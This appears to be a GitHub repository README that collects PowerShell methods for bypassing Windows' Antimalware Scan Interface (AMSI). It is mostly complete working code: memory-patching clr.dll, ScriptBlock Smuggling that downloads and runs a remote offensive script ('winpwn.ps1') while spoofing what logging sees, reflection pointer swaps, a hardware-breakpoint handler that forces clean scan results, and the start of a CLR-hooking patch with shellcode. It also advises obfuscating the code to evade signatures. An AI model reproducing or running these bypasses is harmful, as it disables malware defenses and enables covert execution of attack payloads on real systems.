# Sponsored by

[<img src="https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell/raw/master/images/happy_alp.png" width="300" height="300">](https://www.bluebastion.net/) &emsp; &emsp; &emsp;

# Amsi-Bypass-Powershell #
This repo contains some Antimalware Scan Interface (AMSI) bypass / avoidance methods i found on different Blog Posts.

Most of the scripts are detected by AMSI itself. So you have to find the [trigger](https://github.com/RythmStick/AMSITrigger) and change the signature at the part via variable/function renaming, string replacement or encoding and decoding at runtime. Alternatively obfuscate them via ISESteroids and or Invoke-Obfuscation to get them working. You can also take a look at my [blog post](https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification/) about manually changing the signature to get a valid bypass again.

0. [Patching AmsiScanBuffer in clr.dll](#Patching-Clr "Goto Patching-Clr")
1. [ScriptBlock Smuggling](#ScriptBlock-Smuggling "Goto ScriptBlock-Smuggling")
2. [Reflection ScanContent Change](#Reflection-ScanContent-Change "Goto Reflection-ScanContent-Change")
3. [Using Hardware Breakpoints](#Using-Hardware-Breakpoints "Goto Using-Hardware-Breakpoints")
4. [Using CLR hooking](#Using-CLR-hooking "Goto Using-CLR-hooking")
5. [Patch the provider’s DLL of Microsoft MpOav.dll](#Patch-the-providers-DLL-of-Microsoft-MpOav.dll "Goto Patch-the-providers-DLL-of-Microsoft-MpOav.dll")
6. [Scanning Interception and Provider function patching](#Scanning-Interception "Goto Scanning-Interception")  
7. [Patching AMSI AmsiScanBuffer by rasta-mouse](#Patching-AMSI-AmsiScanBuffer-by-rasta-mouse "Goto Patching-AMSI-AmsiScanBuffer-by-rasta-mouse")
8. [Patching AMSI AmsiOpenSession](#Patching-AMSI-AmsiOpenSession "Goto Patching-AMSI-AmsiOpenSession")
9. [Dont use net webclient](#Dont-use-net-webclient "Goto Dont-use-net-webclient") - this one is not working anymore
10. [Amsi ScanBuffer Patch from -> https://www.contextis.com/de/blog/amsi-bypass](#Amsi-ScanBuffer-Patch "Goto Amsi-ScanBuffer-Patch")
11. [Forcing an error](#Forcing-an-error "Goto Forcing-an-error")
12. [Disable Script Logging](#Disable-Script-Logging "Goto Disable-Script-Logging")
13. [Amsi Buffer Patch - In memory](#Amsi-Buffer-Patch---In-memory "Goto Amsi-Buffer-Patch---In-memory")
14. [Same as 6 but integer Bytes instead of Base64](#Same-as-6-but-integer-Bytes-instead-of-Base64 "Goto Same-as-6-but-integer-Bytes-instead-of-Base64")
15. [Using Matt Graeber's Reflection method](#Using-Matt-Graebers-Reflection-method "Goto Using-Matt-Graebers-Reflection-method")
16. [Using Matt Graeber's Reflection method with WMF5 autologging bypass](#Using-Matt-Graebers-Reflection-method-with-WMF5-autologging-bypass "Goto Using-Matt-Graebers-Reflection-method-with-WMF5-autologging-bypass")
17. [Using Matt Graeber's second Reflection method](#Using-Matt-Graebers-second-Reflection-method "Goto Using-Matt-Graebers-second-Reflection-method")
18. [Using Cornelis de Plaa's DLL hijack method](#Using-Cornelis-de-Plaas-DLL-hijack-method "Goto Using-Cornelis-de-Plaas-DLL-hijack-method")
19. [Use Powershell Version 2 - No AMSI Support there](#Using-PowerShell-version-2 "Goto Using-PowerShell-version-2")
20. [Nishang all in one](#Nishang-all-in-one "Goto Nishang-all-in-one")
21. [Adam Chesters Patch](#Adam-Chester-Patch "Goto Adam-Chester-Patch")
22. [Modified version of 3. Amsi ScanBuffer - no CSC.exe compilation](#Modified-Amsi-ScanBuffer-Patch "Goto Modified-Amsi-ScanBuffer-Patch")
23. [Patching the AmsiScanBuffer address in System.Management.Automation.dll](#Patching-AmsiScanBuffer-Address "Goto Patching-AmsiScanBuffer-Address")

# Patching Clr
- Explained here [Modifying CLR DLL in memory](https://practicalsecurityanalytics.com/new-amsi-bypss-technique-modifying-clr-dll-in-memory/)

```powershell
# Define Constants
$PAGE_READONLY = 0x02
$PAGE_READWRITE = 0x04
$PAGE_EXECUTE_READWRITE = 0x40
$PAGE_EXECUTE_READ = 0x20
$PAGE_GUARD = 0x100
$MEM_COMMIT = 0x1000
$MAX_PATH = 260

# Helper functions
function IsReadable {
    param ($protect, $state)
    return ((($protect -band $PAGE_READONLY) -eq $PAGE_READONLY -or ($protect -band $PAGE_READWRITE) -eq $PAGE_READWRITE -or ($protect -band $PAGE_EXECUTE_READWRITE) -eq $PAGE_EXECUTE_READWRITE -or ($protect -band $PAGE_EXECUTE_READ) -eq $PAGE_EXECUTE_READ) -and ($protect -band $PAGE_GUARD) -ne $PAGE_GUARD -and ($state -band $MEM_COMMIT) -eq $MEM_COMMIT)
}

function PatternMatch {
    param ($buffer, $pattern, $index)
    for ($i = 0; $i -lt $pattern.Length; $i++) {
        if ($buffer[$index + $i] -ne $pattern[$i]) {
            return $false
        }
    }
    return $true
}

if ($PSVersionTable.PSVersion.Major -gt 2) {
    # Create module builder
    $DynAssembly = New-Object System.Reflection.AssemblyName("Win32")
    $AssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule("Win32", $False)

    # Define structs
    $TypeBuilder = $ModuleBuilder.DefineType("Win32.MEMORY_INFO_BASIC", [System.Reflection.TypeAttributes]::Public + [System.Reflection.TypeAttributes]::Sealed + [System.Reflection.TypeAttributes]::SequentialLayout, [System.ValueType])
    [void]$TypeBuilder.DefineField("BaseAddress", [IntPtr], [System.Reflection.FieldAttributes]::Public)
    [void]$TypeBuilder.DefineField("AllocationBase", [IntPtr], [System.Reflection.FieldAttributes]::Public)
    [void]$TypeBuilder.DefineField("AllocationProtect", [Int32], [System.Reflection.FieldAttributes]::Public)
    [void]$TypeBuilder.DefineField("RegionSize", [IntPtr], [System.Reflection.FieldAttributes]::Public)
    [void]$TypeBuilder.DefineField("State", [Int32], [System.Reflection.FieldAttributes]::Public)
    [void]$TypeBuilder.DefineField("Protect", [Int32], [System.Reflection.FieldAttributes]::Public)
    [void]$TypeBuilder.DefineField("Type", [Int32], [System.Reflection.FieldAttributes]::Public)
    $MEMORY_INFO_BASIC_STRUCT = $TypeBuilder.CreateType()

    # Define structs
    $TypeBuilder = $ModuleBuilder.DefineType("Win32.SYSTEM_INFO", [System.Reflection.TypeAttributes]::Public + [System.Reflection.TypeAttributes]::Sealed + [System.Reflection.TypeAttributes]::SequentialLayout, [System.ValueType])
    [void]$TypeBuilder.DefineField("wProcessorArchitecture", [UInt16], [System.Reflection.FieldAttributes]::Public)
    [void]$TypeBuilder.DefineField("wReserved", [UInt16], [System.Reflection.FieldAttributes]::Public)
    [void]$TypeBuilder.DefineField("dwPageSize", [UInt32], [System.Reflection.FieldAttributes]::Public)
    [void]$TypeBuilder.DefineField("lpMinimumApplicationAddress", [IntPtr], [System.Reflection.FieldAttributes]::Public)
    [void]$TypeBuilder.DefineField("lpMaximumApplicationAddress", [IntPtr], [System.Reflection.FieldAttributes]::Public)
    [void]$TypeBuilder.DefineField("dwActiveProcessorMask", [IntPtr], [System.Reflection.FieldAttributes]::Public)
    [void]$TypeBuilder.DefineField("dwNumberOfProcessors", [UInt32], [System.Reflection.FieldAttributes]::Public)
    [void]$TypeBuilder.DefineField("dwProcessorType", [UInt32], [System.Reflection.FieldAttributes]::Public)
    [void]$TypeBuilder.DefineField("dwAllocationGranularity", [UInt32], [System.Reflection.FieldAttributes]::Public)
    [void]$TypeBuilder.DefineField("wProcessorLevel", [UInt16], [System.Reflection.FieldAttributes]::Public)
    [void]$TypeBuilder.DefineField("wProcessorRevision", [UInt16], [System.Reflection.FieldAttributes]::Public)
    $SYSTEM_INFO_STRUCT = $TypeBuilder.CreateType()

    # P/Invoke Methods
    $TypeBuilder = $ModuleBuilder.DefineType("Win32.Kernel32", "Public, Class")
    $DllImportConstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))
    $SetLastError = [Runtime.InteropServices.DllImportAttribute].GetField("SetLastError")
    $SetLastErrorCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor, "kernel32.dll", [Reflection.FieldInfo[]]@($SetLastError), @($True))

    # Define [Win32.Kernel32]::VirtualProtect
    $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod("VirtualProtect", "kernel32.dll", ([Reflection.MethodAttributes]::Public -bor [Reflection.MethodAttributes]::Static), [Reflection.CallingConventions]::Standard, [bool], [Type[]]@([IntPtr], [IntPtr], [Int32], [Int32].MakeByRefType()), [Runtime.InteropServices.CallingConvention]::Winapi, [Runtime.InteropServices.CharSet]::Auto)
    $PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute)

    # Define [Win32.Kernel32]::GetCurrentProcess
    $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod("GetCurrentProcess", "kernel32.dll", ([Reflection.MethodAttributes]::Public -bor [Reflection.MethodAttributes]::Static), [Reflection.CallingConventions]::Standard, [IntPtr], [Type[]]@(), [Runtime.InteropServices.CallingConvention]::Winapi, [Runtime.InteropServices.CharSet]::Auto)
    $PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute)

    # Define [Win32.Kernel32]::VirtualQuery
    $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod("VirtualQuery", "kernel32.dll", ([Reflection.MethodAttributes]::Public -bor [Reflection.MethodAttributes]::Static), [Reflection.CallingConventions]::Standard, [IntPtr], [Type[]]@([IntPtr], [Win32.MEMORY_INFO_BASIC].MakeByRefType(), [uint32]), [Runtime.InteropServices.CallingConvention]::Winapi, [Runtime.InteropServices.CharSet]::Auto)
    $PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute)

    # Define [Win32.Kernel32]::GetSystemInfo
    $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod("GetSystemInfo", "kernel32.dll", ([Reflection.MethodAttributes]::Public -bor [Reflection.MethodAttributes]::Static), [Reflection.CallingConventions]::Standard, [void], [Type[]]@([Win32.SYSTEM_INFO].MakeByRefType()), [Runtime.InteropServices.CallingConvention]::Winapi, [Runtime.InteropServices.CharSet]::Auto)
    $PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute)

    # Define [Win32.Kernel32]::GetMappedFileName
    $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod("GetMappedFileName", "psapi.dll", ([Reflection.MethodAttributes]::Public -bor [Reflection.MethodAttributes]::Static), [Reflection.CallingConventions]::Standard, [Int32], [Type[]]@([IntPtr], [IntPtr], [System.Text.StringBuilder], [uint32]), [Runtime.InteropServices.CallingConvention]::Winapi, [Runtime.InteropServices.CharSet]::Auto)
    $PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute)

    # Define [Win32.Kernel32]::ReadProcessMemory
    $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod("ReadProcessMemory", "kernel32.dll", ([Reflection.MethodAttributes]::Public -bor [Reflection.MethodAttributes]::Static), [Reflection.CallingConventions]::Standard, [Int32], [Type[]]@([IntPtr], [IntPtr], [byte[]], [int], [int].MakeByRefType()), [Runtime.InteropServices.CallingConvention]::Winapi, [Runtime.InteropServices.CharSet]::Auto)
    $PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute)

    # Define [Win32.Kernel32]::WriteProcessMemory
    $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod("WriteProcessMemory", "kernel32.dll", ([Reflection.MethodAttributes]::Public -bor [Reflection.MethodAttributes]::Static), [Reflection.CallingConventions]::Standard, [Int32], [Type[]]@([IntPtr], [IntPtr], [byte[]], [int], [int].MakeByRefType()), [Runtime.InteropServices.CallingConvention]::Winapi, [Runtime.InteropServices.CharSet]::Auto)
    $PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute)

    $Kernel32 = $TypeBuilder.CreateType()

    $a = "Ams"
    $b = "iSc"
    $c = "anBuf"
    $d = "fer"
    $signature = [System.Text.Encoding]::UTF8.GetBytes($a + $b + $c + $d)
    $hProcess = [Win32.Kernel32]::GetCurrentProcess()

    # Get system information
    $sysInfo = New-Object Win32.SYSTEM_INFO
    [void][Win32.Kernel32]::GetSystemInfo([ref]$sysInfo)

    # List of memory regions to scan
    $memoryRegions = @()
    $address = [IntPtr]::Zero

    # Scan through memory regions
    while ($address.ToInt64() -lt $sysInfo.lpMaximumApplicationAddress.ToInt64()) {
        $memInfo = New-Object Win32.MEMORY_INFO_BASIC
        if ([Win32.Kernel32]::VirtualQuery($address, [ref]$memInfo, [System.Runtime.InteropServices.Marshal]::SizeOf($memInfo))) {
            $memoryRegions += $memInfo
        }
        # Move to the next memory region
        $address = New-Object IntPtr($memInfo.BaseAddress.ToInt64() + $memInfo.RegionSize.ToInt64())
    }

    $count = 0

    # Loop through memory regions
    foreach ($region in $memoryRegions) {
        # Check if the region is readable and writable
        if (-not (IsReadable $region.Protect $region.State)) {
            continue
        }
        # Check if the region contains a mapped file
        $pathBuilder = New-Object System.Text.StringBuilder $MAX_PATH
        if ([Win32.Kernel32]::GetMappedFileName($hProcess, $region.BaseAddress, $pathBuilder, $MAX_PATH) -gt 0) {
            $path = $pathBuilder.ToString()
            if ($path.EndsWith("clr.dll", [StringComparison]::InvariantCultureIgnoreCase)) {
                # Scan the region for the pattern
                $buffer = New-Object byte[] $region.RegionSize.ToInt64()
                $bytesRead = 0
                [void][Win32.Kernel32]::ReadProcessMemory($hProcess, $region.BaseAddress, $buffer, $buffer.Length, [ref]$bytesRead)
                for ($k = 0; $k -lt ($bytesRead - $signature.Length); $k++) {
                    $found = $True
                    for ($m = 0; $m -lt $signature.Length; $m++) {
                        if ($buffer[$k + $m] -ne $signature[$m]) {
                            $found = $False
                            break
                        }
                    }
                    if ($found) {
                        $oldProtect = 0
                        if (($region.Protect -band $PAGE_READWRITE) -ne $PAGE_READWRITE) {
                            [void][Win32.Kernel32]::VirtualProtect($region.BaseAddress, $buffer.Length, $PAGE_EXECUTE_READWRITE, [ref]$oldProtect)
                        }
                        $replacement = New-Object byte[] $signature.Length
                        $bytesWritten = 0
                        [void][Win32.Kernel32]::WriteProcessMemory($hProcess, [IntPtr]::Add($region.BaseAddress, $k), $replacement, $replacement.Length, [ref]$bytesWritten)
                        $count++
                        if (($region.Protect -band $PAGE_READWRITE) -ne $PAGE_READWRITE) {
                            [void][Win32.Kernel32]::VirtualProtect($region.BaseAddress, $buffer.Length, $region.Protect, [ref]$oldProtect)
                        }
                    }
                }
            }
        }
    }
}
```

# ScriptBlock Smuggling
- Original technique from [Hubbl3](https://x.com/_Hubbl3)
- Explained here [ScriptBlockSmuggling](https://bc-security.org/scriptblock-smuggling/)

```powershell
$c = (new-Object net.webclient).downloadstring('https://gist.githubusercontent.com/S3cur3Th1sSh1t/2f4d37fde889af8f02b287db84f8ec4b/raw/0e2823c209fb7ca85f1aa3d0a0ab9c7871ef97bd/winpwn.ps1')
$SpoofedAst = [ScriptBlock]::Create("Write-Output 'Hello'").Ast  
$ExecutedAst = [ScriptBlock]::Create("$c").Ast
$Ast = [System.Management.Automation.Language.ScriptBlockAst]::new($SpoofedAst.Extent,
                                                                   $null,
                                                                   $null,
                                                                   $null,
                                                                   $ExecutedAst.EndBlock.Copy(),
                                                                   $null)
$Sb = $Ast.GetScriptBlock()
# Any function - such as in this case WinPwn - that you want to be executed must be already called in the Scriptblock on the remote webserver. Fun fact, scripts that are loaded by the Script itself via iex(new-object net.webclient) also bypass AMSI.
& $Sb
```

# Reflection ScanContent Change
- Code published here: [cybersectroll/TrollAMSI](https://github.com/cybersectroll/TrollAMSI)

```powershell
class TrollAMSI{static [int] M([string]$c, [string]$s){return 1}}
$o = [Ref].Assembly.GetType('System.Ma'+'nag'+'eme'+'nt.Autom'+'ation.A'+'ms'+'iU'+'ti'+'ls').GetMethods('N'+'onPu'+'blic,st'+'at'+'ic') | Where-Object Name -eq ScanContent
$t = [TrollAMSI].GetMethods() | Where-Object Name -eq 'M'
#[System.Runtime.CompilerServices.RuntimeHelpers]::PrepareMethod($t.MethodHandle)  
#[System.Runtime.CompilerServices.RuntimeHelpers]::PrepareMethod($o.MethodHandle)
[System.Runtime.InteropServices.Marshal]::Copy(@([System.Runtime.InteropServices.Marshal]::ReadIntPtr([long]$t.MethodHandle.Value + [long]8)),0, [long]$o.MethodHandle.Value + [long]8,1)
```

# Using Hardware Breakpoints
- Original technique from @_EthicalChaos_ (https://twitter.com/_EthicalChaos_)
- C# Code by @d_tranman: https://twitter.com/d_tranman/status/1628954053115002881
- Only slight modifications by me for Powershell compitability

```powershell
$HardwareBreakpoint = @"
// Technique from @_EthicalChaos_ (https://twitter.com/_EthicalChaos_)
// Original Code by @d_tranman: https://twitter.com/d_tranman/status/1628954053115002881
// Slight modifications by @ShitSecure for Powershell runtime compitability as the original code could not be used like this. Also the removal of the Hardware breakpoint was removed, so that every following future Powershell command bypasses AMSI as well.

using System;
using System.Collections.Generic;
using System.Linq.Expressions;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;

namespace Test
{
    // CCOB IS THE GOAT
   
    public class Program
    {
        static string a = "msi";
        static string b = "anB";
        static string c = "ff";
        static IntPtr BaseAddress = WinAPI.LoadLibrary("a" + a + ".dll");
        static IntPtr pABuF = WinAPI.GetProcAddress(BaseAddress, "A" + a + "Sc" + b + "u" + c + "er");
        static IntPtr pCtx = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(WinAPI.CONTEXT64)));
        
        public static void SetupBypass()
        {

            WinAPI.CONTEXT64 ctx = new WinAPI.CONTEXT64();
            ctx.ContextFlags = WinAPI.CONTEXT64_FLAGS.CONTEXT64_ALL;

            MethodInfo method = typeof(Program).GetMethod("Handler", BindingFlags.Static | BindingFlags.Public);
            IntPtr hExHandler = WinAPI.AddVectoredExceptionHandler(1, method.MethodHandle.GetFunctionPointer());
            
            // Saving our context to a struct
            Marshal.StructureToPtr(ctx, pCtx, true);
            bool b = WinAPI.GetThreadContext((IntPtr)(-2), pCtx);
            ctx = (WinAPI.CONTEXT64)Marshal.PtrToStructure(pCtx, typeof(WinAPI.CONTEXT64));

            EnableBreakpoint(ctx, pABuF, 0);

            WinAPI.SetThreadContext((IntPtr)(-2), pCtx);

        }
        
        public static long Handler(IntPtr exceptions)
        {
            WinAPI.EXCEPTION_POINTERS ep = new WinAPI.EXCEPTION_POINTERS();
            ep = (WinAPI.EXCEPTION_POINTERS)Marshal.PtrToStructure(exceptions, typeof(WinAPI.EXCEPTION_POINTERS));

            WinAPI.EXCEPTION_RECORD ExceptionRecord = new WinAPI.EXCEPTION_RECORD();
            ExceptionRecord = (WinAPI.EXCEPTION_RECORD)Marshal.PtrToStructure(ep.pExceptionRecord, typeof(WinAPI.EXCEPTION_RECORD));

            WinAPI.CONTEXT64 ContextRecord = new WinAPI.CONTEXT64();
            ContextRecord = (WinAPI.CONTEXT64)Marshal.PtrToStructure(ep.pContextRecord, typeof(WinAPI.CONTEXT64));

            if (ExceptionRecord.ExceptionCode == WinAPI.EXCEPTION_SINGLE_STEP && ExceptionRecord.ExceptionAddress == pABuF)
            {
                ulong ReturnAddress = (ulong)Marshal.ReadInt64((IntPtr)ContextRecord.Rsp);

                // THE OUTPUT AMSIRESULT IS A POINTER, NOT THE EXPLICIT VALUE AAAAAAAAAA
                IntPtr ScanResult = Marshal.ReadIntPtr((IntPtr)(ContextRecord.Rsp + (6 * 8))); // 5th arg, swap it to clean
                //Console.WriteLine("Buffer: 0x{0:X}", (long)ContextRecord.R8);
                //Console.WriteLine("Scan Result: 0x{0:X}", Marshal.ReadInt32(ScanResult));

                Marshal.WriteInt32(ScanResult, 0, WinAPI.AMSI_RESULT_CLEAN);

                ContextRecord.Rip = ReturnAddress;
                ContextRecord.Rsp += 8;
                ContextRecord.Rax = 0; // S_OK
                
                Marshal.StructureToPtr(ContextRecord, ep.pContextRecord, true); //Paste our altered ctx back in TO THE RIGHT STRUCT
                return WinAPI.EXCEPTION_CONTINUE_EXECUTION;
            }
            else
            {
                return WinAPI.EXCEPTION_CONTINUE_SEARCH;
            }

        }
        public static void EnableBreakpoint(WinAPI.CONTEXT64 ctx, IntPtr address, int index)
        {

            switch (index)
            {
                case 0:
                    ctx.Dr0 = (ulong)address.ToInt64();
                    break;
                case 1:
                    ctx.Dr1 = (ulong)address.ToInt64();
                    break;
                case 2:
                    ctx.Dr2 = (ulong)address.ToInt64();
                    break;
                case 3:
                    ctx.Dr3 = (ulong)address.ToInt64();
                    break;
            }

            //Set bits 16-31 as 0, which sets
            //DR0-DR3 HBP's for execute HBP
            ctx.Dr7 = SetBits(ctx.Dr7, 16, 16, 0);

            //Set DRx HBP as enabled for local mode
            ctx.Dr7 = SetBits(ctx.Dr7, (index * 2), 1, 1);
            ctx.Dr6 = 0;

            // Now copy the changed ctx into the original struct
            Marshal.StructureToPtr(ctx, pCtx, true);
        }
        public static ulong SetBits(ulong dw, int lowBit, int bits, ulong newValue)
        {
            ulong mask = (1UL << bits) - 1UL;
            dw = (dw & ~(mask << lowBit)) | (newValue << lowBit);
            return dw;
        }
    }
    public class WinAPI
    {
        public const UInt32 DBG_CONTINUE = 0x00010002;
        public const UInt32 DBG_EXCEPTION_NOT_HANDLED = 0x80010001;
        public const Int32 EXCEPTION_CONTINUE_EXECUTION = -1;
        public const Int32 EXCEPTION_CONTINUE_SEARCH = 0;
        public const Int32 CREATE_PROCESS_DEBUG_EVENT = 3;
        public const Int32 CREATE_THREAD_DEBUG_EVENT = 2;
        public const Int32 EXCEPTION_DEBUG_EVENT = 1;
        public const Int32 EXIT_PROCESS_DEBUG_EVENT = 5;
        public const Int32 EXIT_THREAD_DEBUG_EVENT = 4;
        public const Int32 LOAD_DLL_DEBUG_EVENT = 6;
        public const Int32 OUTPUT_DEBUG_STRING_EVENT = 8;
        public const Int32 RIP_EVENT = 9;
        public const Int32 UNLOAD_DLL_DEBUG_EVENT = 7;

        public const UInt32 EXCEPTION_ACCESS_VIOLATION = 0xC0000005;
        public const UInt32 EXCEPTION_BREAKPOINT = 0x80000003;
        public const UInt32 EXCEPTION_DATATYPE_MISALIGNMENT = 0x80000002;
        public const UInt32 EXCEPTION_SINGLE_STEP = 0x80000004;
        public const UInt32 EXCEPTION_ARRAY_BOUNDS_EXCEEDED = 0xC000008C;
        public const UInt32 EXCEPTION_INT_DIVIDE_BY_ZERO = 0xC0000094;
        public const UInt32 DBG_CONTROL_C = 0x40010006;
        public const UInt32 DEBUG_PROCESS = 0x00000001;
        public const UInt32 CREATE_SUSPENDED = 0x00000004;
        public const UInt32 CREATE_NEW_CONSOLE = 0x00000010;

        public const Int32 AMSI_RESULT_CLEAN = 0;

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool SetThreadContext(IntPtr hThread, IntPtr lpContext);
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool GetThreadContext(IntPtr hThread, IntPtr lpContext);
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Ansi)]
        public static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)] string lpFileName);

        [DllImport("Kernel32.dll")]
        public static extern IntPtr AddVectoredExceptionHandler(uint First, IntPtr Handler);
        [Flags]
        public enum CONTEXT64_FLAGS : uint
        {
            CONTEXT64_AMD64 = 0x100000,
            CONTEXT64_CONTROL = CONTEXT64_AMD64 | 0x01,
            CONTEXT64_INTEGER = CONTEXT64_AMD64 | 0x02,
            CONTEXT64_SEGMENTS = CONTEXT64_AMD64 | 0x04,
            CONTEXT64_FLOATING_POINT = CONTEXT64_AMD64 | 0x08,
            CONTEXT64_DEBUG_REGISTERS = CONTEXT64_AMD64 | 0x10,
            CONTEXT64_FULL = CONTEXT64_CONTROL | CONTEXT64_INTEGER | CONTEXT64_FLOATING_POINT,
            CONTEXT64_ALL = CONTEXT64_CONTROL | CONTEXT64_INTEGER | CONTEXT64_SEGMENTS | CONTEXT64_FLOATING_POINT | CONTEXT64_DEBUG_REGISTERS
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct M128A
        {
            public ulong High;
            public long Low;

            public override string ToString()
            {
                return string.Format("High:{0}, Low:{1}", this.High, this.Low);
            }
        }

        /// <summary>
        /// x64
        /// </summary>
        [StructLayout(LayoutKind.Sequential, Pack = 16)]
        public struct XSAVE_FORMAT64
        {
            public ushort ControlWord;
            public ushort StatusWord;
            public byte TagWord;
            public byte Reserved1;
            public ushort ErrorOpcode;
            public uint ErrorOffset;
            public ushort ErrorSelector;
            public ushort Reserved2;
            public uint DataOffset;
            public ushort DataSelector;
            public ushort Reserved3;
            public uint MxCsr;
            public uint MxCsr_Mask;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
            public M128A[] FloatRegisters;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
            public M128A[] XmmRegisters;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 96)]
            public byte[] Reserved4;
        }

        /// <summary>
        /// x64
        /// </summary>
        [StructLayout(LayoutKind.Sequential, Pack = 16)]
        public struct CONTEXT64
        {
            public ulong P1Home;
            public ulong P2Home;
            public ulong P3Home;
            public ulong P4Home;
            public ulong P5Home;
            public ulong P6Home;

            public CONTEXT64_FLAGS ContextFlags;
            public uint MxCsr;

            public ushort SegCs;
            public ushort SegDs;
            public ushort SegEs;
            public ushort SegFs;
            public ushort SegGs;
            public ushort SegSs;
            public uint EFlags;

            public ulong Dr0;
            public ulong Dr1;
            public ulong Dr2;
            public ulong Dr3;
            public ulong Dr6;
            public ulong Dr7;

            public ulong Rax;
            public ulong Rcx;
            public ulong Rdx;
            public ulong Rbx;
            public ulong Rsp;
            public ulong Rbp;
            public ulong Rsi;
            public ulong Rdi;
            public ulong R8;
            public ulong R9;
            public ulong R10;
            public ulong R11;
            public ulong R12;
            public ulong R13;
            public ulong R14;
            public ulong R15;
            public ulong Rip;

            public XSAVE_FORMAT64 DUMMYUNIONNAME;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 26)]
            public M128A[] VectorRegister;
            public ulong VectorControl;

            public ulong DebugControl;
            public ulong LastBranchToRip;
            public ulong LastBranchFromRip;
            public ulong LastExceptionToRip;
            public ulong LastExceptionFromRip;
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct EXCEPTION_RECORD
        {
            public uint ExceptionCode;
            public uint ExceptionFlags;
            public IntPtr ExceptionRecord;
            public IntPtr ExceptionAddress;
            public uint NumberParameters;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 15, ArraySubType = UnmanagedType.U4)] public uint[] ExceptionInformation;
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct EXCEPTION_POINTERS
        {
            public IntPtr pExceptionRecord;
            public IntPtr pContextRecord;
        }
    }
}


"@

Add-Type -TypeDefinition $HardwareBreakpoint

[Test.Program]::SetupBypass()

```

# Using CLR hooking
- Source: [https://practicalsecurityanalytics.com/new-amsi-bypass-using-clr-hooking/](https://practicalsecurityanalytics.com/new-amsi-bypass-using-clr-hooking/)

```powershell

$code = @"
using System;
using System.ComponentModel;
using System.Management.Automation;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
namespace Editor {
    public static class Methods {
        public static void Patch() {
            MethodInfo original = typeof(PSObject).Assembly.GetType(Methods.CLASS).GetMethod(Methods.METHOD, BindingFlags.NonPublic | BindingFlags.Static);
            MethodInfo replacement = typeof(Methods).GetMethod("Dummy", BindingFlags.NonPublic | BindingFlags.Static);
            Methods.Patch(original, replacement);
        }
        [MethodImpl(MethodImplOptions.NoOptimization | MethodImplOptions.NoInlining)]
        private static int Dummy(string content, string metadata) {
            return 1;
        }
        public static void Patch(MethodInfo original, MethodInfo replacement) {
            //JIT compile methods
            RuntimeHelpers.PrepareMethod(original.MethodHandle);
            RuntimeHelpers.PrepareMethod(replacement.MethodHandle);
            //Get pointers to the functions
            IntPtr originalSite = original.MethodHandle.GetFunctionPointer();
            IntPtr replacementSite = replacement.MethodHandle.GetFunctionPointer();
            //Generate architecture specific shellcode
            byte[] patch = null;
            if (IntPtr.Size == 8) {
                patch = new byte[] { 0x49, 0xbb, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x41, 0xff, 0xe3 };
                byte[] address = BitConverter.GetBytes(replacementSite.ToInt64());
                for (int i = 0; i < address.Length; i++) {
                    patch[i + 2] = address[i];
                }
            } else {
                patch = new byte[] { 0x68, 0x0, 0x0, 0x0, 0x0, 0xc3 };
                byte[] address = BitConverter.GetBytes(replacementSite.ToInt32());
                for (int i = 0; i < address.Length; i++) {
                    patch[i + 1] = address[i];
                }
            }
            //Temporarily change permissions to RWE
            uint oldprotect;
            if (!VirtualProtect(originalSite, (UIntPtr)patch.Length, 0x40, out oldprotect)) {
                throw new Win32Exception();
            }
            //Apply the patch
            IntPtr written = IntPtr.Zero;
            if (!Methods.WriteProcessMemory(GetCurrentProcess(), originalSite, patch, (uint)patch.Length, out written)) {
                throw new Win32Exception();
            }
            //Flush insutruction cache to make sure our new code executes
            if (!FlushInstructionCache(GetCurrentProcess(), originalSite, (UIntPtr)patch.Length)) {
                throw new Win32Exception();
            }
            //Restore the original memory protection settings
            if (!VirtualProtect(originalSite, (UIntPtr)patch.Length, oldprotect, out oldprotect)) {
                throw new Win32Exception();
            }
        }
        private static string Transform(string input) {
            StringBuilder builder = new StringBuilder(input.Length + 1);    
            foreach(char c in input) {
                char m = (char)((int)c - 1);
                builder.Append(m);
            }
            return builder.ToString();
        }
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool FlushInstructionCache(IntPtr hProcess, IntPtr lpBaseAddress, UIntPtr dwSize);
        [DllImport("kernel32.dll", SetLastError = true)]
